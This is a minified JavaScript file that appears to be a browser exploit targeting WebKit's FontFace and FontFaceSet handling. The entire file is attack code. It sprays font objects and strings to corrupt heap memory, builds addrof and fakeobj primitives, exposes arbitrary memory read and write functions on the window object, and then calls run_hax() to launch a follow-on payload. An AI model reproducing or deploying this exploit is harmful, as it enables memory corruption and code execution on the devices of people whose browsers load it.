var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8594325504,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){for(var r=new ArrayBuffer(8),e=new Uint8Array(r),n=new Uint32Array(r),t=new Float64Array(r),a=[],o=0;o<SPRAY_FONTS;o++)a.push(new FontFace("font1","",{}));var f=new FontFace("font2","url(data:text/html,)",{});a.push(f);var i=[];for(o=0;o<512;o++)i.push(new Array(31));i[256][0]=1.5,i[257][0]={},i[258][0]=1.5;var _={a:i[256],b:new Uint32Array(1),c:!0},A={},u=1e7;function S(r){for(var e="",n=0;n<8;n++)e+=String.fromCharCode(r%256),r=(r-r%256)/256;return e}function l(r,e){void 0===e&&(e=0);for(var n=0,t=7;t>=0;t--)n=256*n+r.charCodeAt(e+t);return n}var w=[];function s(r,e){var n=e+"\0".repeat(r-STRING_OFFSET-8-e.length)+u++;return A[n]=1,w.push(n),n}var c=GUESS_FONT,E=!0,v=0,h=0;window.ffses={};do{var F=S(NPAGES+2);for(o=0;o<NPAGES;o++)F+=S(c+o*PAGE_SIZE);for(F+=S(INVALID_POINTER),o=0;o<256;o++)s(HASHMAP_BUCKET,F);ffses["search_"+ ++h]=new FontFaceSet(a);var d=s(HASHMAP_BUCKET,F),C=null,T=null;for(o=0;o<SPRAY_FONTS;o++)if(a[o].family="search"+h,d.substr(0,F.length)!=F){C=o;var p=d.substr(0,F.length);for(o=1;o<=NPAGES;o++)if(p.substr(8*o,8)!=F.substr(8*o,8)){T=l(F.substr(8*o,8));break}0==v++&&(c=T+2*PAGE_SIZE,T=null);break}(E=!E)&&(c+=NPAGES*PAGE_SIZE)}while(null===T);for(F="",F+=S(26),F+=S(T),F+=S(T+SIZEOF_CSS_FONT_FACE),o=0;o<19;o++)F+=S(INVALID_POINTER);for(o=0;o<256;o++)s(HASHMAP_BUCKET,F);var N=[];for(o=0;;o++){ffses["ffs_leak_"+o]=new FontFaceSet([a[C],a[C+1],f]);var P=s(HASHMAP_BUCKET,F);N.push(s(HASHMAP_BUCKET,F)),a[C].family="evil2",a[C+1].family="evil3";var H=l(P.substr(P.length-8));if(H<281474976710656)break}function I(r,e){var n="";n+="0000",n+="ÿ\0\0\0ÿÿÿÿ",n+=S(r),n+=S(2147483668),F="",F+=S(29),F+=S(T),F+=S(T+SIZEOF_CSS_FONT_FACE),F+=S(T+2*SIZEOF_CSS_FONT_FACE);for(var t=0;t<18;t++)F+=S(INVALID_POINTER);for(t=0;t<256;t++)s(HASHMAP_BUCKET,F);ffses[e]=new FontFaceSet([a[C],a[C+1],a[C+2],f]),s(HASHMAP_BUCKET,F);var o=s(HASHMAP_BUCKET,n);return a[C].family=e+"_evil1",a[C+1].family=e+"_evil2",a[C+2].family=e+"_evil3",N.push(o),o.length<1e3?I(r,e+"_"):o}var O=I(H,"ffs3");for(o=0;o<1e5;o++)s(128,"");var m=[];for(o=0;o<65536;o++)m.push({value:1094927426}),m.push({value:_});for(var M=null;null===M;)for(Object.defineProperties({},m),o=0;;o++)if(66==O.charCodeAt(o)&&68==O.charCodeAt(o+1)&&67==O.charCodeAt(o+2)&&65==O.charCodeAt(o+3)&&0==O.charCodeAt(o+4)&&0==O.charCodeAt(o+5)&&254==O.charCodeAt(o+6)&&255==O.charCodeAt(o+7)&&14==O.charCodeAt(o+24)){M=l(O,o+32);break}var U=I(M,"ffs4"),b=l(U,16),y=l(U,24),R=l(I(b,"ffs5"),8),G=I(y,"ffs6");for(o=0;o<8;o++)e[o]=G.charCodeAt(o);var B=n[0],K=n[1];for(n[0]=65536,n[1]=0,i[257][1]={},i[257][0]=t[0],n[0]=T+12*SIZEOF_CSS_FONT_FACE|0,n[1]=(T-T%4294967296)/4294967296,i[256][o]=t[0],pp_s="",pp_s+=S(56),o=0;o<12;o++)pp_s+=S(T+o*SIZEOF_CSS_FONT_FACE);var Z="";Z+="0000",Z+=S(INVALID_POINTER),Z+=S(R),Z+='\0\0\0\0"\0\0\0';var g=[];for(o=0;o<12;o++)g.push(a[C+o]);g.push(f);var j=[a[C+12]];for(o=0;o<5;o++)j.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(o=0;o<HAMMER_NSTRINGS;o++)s(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(g),s(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(j);var k=s(HASHMAP_BUCKET,Z);for(N.push(k),o=0;o<13;o++)a[C+o].family="hammer"+o;function D(r){return i[257][32]=r,t[0]=i[258][0],4294967296*n[1]+n[0]}var L=new Uint32Array(8),V=new Uint8Array(1),x=new Uint32Array(8),Y={obj:null},z=D(V),q=D(Y);n[0]=B,n[1]=K,e[6]=7;var J,Q,W={jscell:t[0],butterfly:!0,buffer:L,size:22136};function X(r,e){e[4]=0|r,e[5]=r/4294967296|0}function $(r,e){X(r,L),L[6]=e}window.addrof=function(r){return Y.obj=r,(e=x)[4]+4294967296*e[5];var e},window.fakeobj=function(r){return X(r,x),Y.obj},window.read_mem=function(r,e){$(r,e);for(var n=[],t=0;t<e;t++)n.push(V[t]);return n},window.write_mem=function(r,e){$(r,e.length);for(var n=0;n<e.length;n++)V[n]=e[n]},window.read_ptr_at=function(r){for(var e=0,n=read_mem(r,8),t=7;t>=0;t--)e=256*e+n[t];return e},window.write_ptr_at=function(r,e){for(var n=[],t=0;t<8;t++)n.push(255&e),e/=256;write_mem(r,n)},J=D(W)+16,n[0]=J,n[1]=(J-J%4294967296)/4294967296,i[258][0]=t[0],(Q=i[257][32])[4]=z,Q[5]=(z-z%4294967296)/4294967296,W.buffer=x,Q[4]=q,Q[5]=(q-q%4294967296)/4294967296,Q=null,function(){var r=read_ptr_at(addrof(k)+8)-208;write_mem(r,read_mem(r-96,208));for(var e=0;e<N.length;e++){var n=read_ptr_at(addrof(N[e])+8);write_ptr_at(n,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(n+8,n+20),write_ptr_at(n+16,2147483668)}write_ptr_at(R+248,133143986207)}();var rr=new Uint32Array(8),er=new Uint32Array(2),nr=addrof(er),tr=fakeobj(addrof(W)+16);W.buffer=rr,tr[4]=nr,tr[5]=(nr-nr%4294967296)/4294967296;var ar={write8:function(r,e){rr[4]=r.low,rr[5]=r.hi,e instanceof int64?(er[0]=e.low,er[1]=e.hi):(er[0]=e,er[1]=0)},write4:function(r,e){rr[4]=r.low,rr[5]=r.hi,e instanceof int64?er[0]=e.low:er[0]=e},write2:function(r,e){rr[4]=r.low,rr[5]=r.hi;var n=4294901760&er[0];e instanceof int64?er[0]=65535&e.low|n:er[0]=65535&e|n},write1:function(r,e){rr[4]=r.low,rr[5]=r.hi;var n=4294967040&er[0];e instanceof int64?er[0]=255&e.low|n:er[0]=255&e|n},read8:function(r){return rr[4]=r.low,rr[5]=r.hi,new int64(er[0],er[1])},read4:function(r){return rr[4]=r.low,rr[5]=r.hi,er[0]},read2:function(r){return rr[4]=r.low,rr[5]=r.hi,65535&er[0]},read1:function(r){return rr[4]=r.low,rr[5]=r.hi,255&er[0]},leakval:function(r){return Y.obj=r,new int64(x[4],x[5])}};window.p=ar,run_hax()}